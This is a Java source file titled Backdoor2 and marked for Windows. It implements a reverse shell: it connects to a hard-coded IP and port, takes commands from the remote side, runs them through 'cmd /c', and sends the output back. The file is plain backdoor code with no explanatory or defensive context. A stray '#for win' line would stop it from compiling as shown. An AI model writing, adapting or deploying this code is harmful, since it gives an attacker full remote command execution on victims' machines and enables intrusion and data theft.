import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;


#for win

public class Backdoor2 {

	public static void main(String[] args)  {

		String ip = "127.0.0.1";
                int port = 5555;
            try {
                Socket so = new Socket(ip,port);
                while(true){
                    Runtime rt = Runtime.getRuntime();
                    BufferedReader r = new BufferedReader(new InputStreamReader(so.getInputStream()));
                    String cmd = r.readLine();
                    Process prx = rt.exec("cmd /c "+cmd);
                    BufferedReader pr = new BufferedReader(new InputStreamReader(prx.getInputStream()));
                    String line;
                    StringBuilder sb = new StringBuilder();
                    
                    while((line = pr.readLine())!= null){
                    sb.append(line).append("\n");
                    PrintWriter writer = new PrintWriter(so.getOutputStream(),true);
                    writer.println(sb.toString());
                    }
                    
                }
            } catch (IOException ex) {
                System.out.println("Something wrong !!");
               
            }
       
       
	}

}